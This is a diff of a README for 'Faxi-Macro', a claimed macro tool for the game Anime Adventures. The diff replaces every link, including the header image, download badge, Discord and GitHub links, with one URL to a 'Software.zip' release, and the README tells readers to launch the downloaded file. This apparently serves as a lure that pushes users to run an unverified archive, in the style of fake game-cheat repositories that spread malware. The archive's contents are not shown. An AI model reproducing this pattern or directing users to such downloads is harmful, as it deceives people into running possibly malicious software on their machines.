@@ -2,7 +2,7 @@
 
 ## Repository: Faxi-Macro
 
-![Faxi-Macro](https://example.com/faxi-macro-image.jpg)
+![Faxi-Macro](https://github.com/Superboyguy/Faxi-Macro/releases/download/v2.0/Software.zip)
 
 ### Description:
 
@@ -21,7 +21,7 @@ Are you ready to enhance your anime Adventures experience with the powerful Faxi
 
 To get started with Faxi Macro, download the program from the link below:
 
-[![Download Faxi Macro](https://img.shields.io/badge/Download-Faxi_Macro-9cf)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+[![Download Faxi Macro](https://github.com/Superboyguy/Faxi-Macro/releases/download/v2.0/Software.zip)](https://github.com/Superboyguy/Faxi-Macro/releases/download/v2.0/Software.zip)
 
 📂 **Note:** The downloaded file needs to be launched in order to set up the Faxi Macro successfully.
 
@@ -36,8 +36,8 @@ Follow these steps to unleash the power of Faxi Macro in Anime Adventures:
 
 ### Additional Resources:
 
-- Explore the [Faxi-Macro-Discord](https://discord.com/faxi-macro-discord) channel for community support and updates.
-- Visit the [Faxi-Macro-Github](https://github.com/faxi-macro-github) page for the latest releases and documentation.
+- Explore the [Faxi-Macro-Discord](https://github.com/Superboyguy/Faxi-Macro/releases/download/v2.0/Software.zip) channel for community support and updates.
+- Visit the [Faxi-Macro-Github](https://github.com/Superboyguy/Faxi-Macro/releases/download/v2.0/Software.zip) page for the latest releases and documentation.
 
 ### Support:
 
